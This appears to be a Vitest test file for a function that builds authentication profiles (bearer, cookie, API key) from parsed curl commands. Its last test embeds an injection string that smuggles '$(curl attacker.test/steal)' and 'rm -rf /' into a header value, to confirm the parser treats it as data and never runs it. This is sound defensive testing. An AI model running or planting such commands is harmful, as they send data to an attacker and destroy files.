import { describe, expect, it } from "vitest";
import { parseCurlCommand } from "../operation-discovery/curl-parser";
import { authProfileFromCurl } from "./curl-to-auth-profile";

describe("authProfileFromCurl", () => {
  it("produces the expected BEARER profile from a sample curl command with an Authorization header, per the spec scenario", () => {
    const parsed = parseCurlCommand(
      'curl -X GET https://example.com/api/me -H \'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abc.def\'',
    );
    const profile = authProfileFromCurl(parsed, "Imported Profile");
    expect(profile).toEqual({ name: "Imported Profile", method: "BEARER", credential: "eyJhbGciOiJIUzI1NiJ9.abc.def" });
  });

  it("produces a COOKIE profile when the command carries a -b cookie flag instead", () => {
    const parsed = parseCurlCommand("curl https://example.com/ -b 'session=abc123'");
    const profile = authProfileFromCurl(parsed, "Imported Cookie Profile");
    expect(profile).toEqual({ name: "Imported Cookie Profile", method: "COOKIE", credential: "session=abc123" });
  });

  it("produces an API_KEY profile from an X-API-Key header", () => {
    const parsed = parseCurlCommand('curl https://example.com/ -H "X-API-Key: my-api-key-value"');
    const profile = authProfileFromCurl(parsed, "Imported API Key Profile");
    expect(profile).toEqual({ name: "Imported API Key Profile", method: "API_KEY", credential: "my-api-key-value" });
  });

  it("handles shell metacharacters in the imported header/data safely, never invoking a shell", () => {
    const dangerous = "$(curl attacker.test/steal); `rm -rf /`";
    const parsed = parseCurlCommand(`curl -X POST https://example.com/api -H "Authorization: Bearer ${dangerous}"`);
    const profile = authProfileFromCurl(parsed, "Dangerous Import");
    expect(profile.credential).toBe(dangerous); // treated purely as data
    expect(profile.method).toBe("BEARER");
  });
});
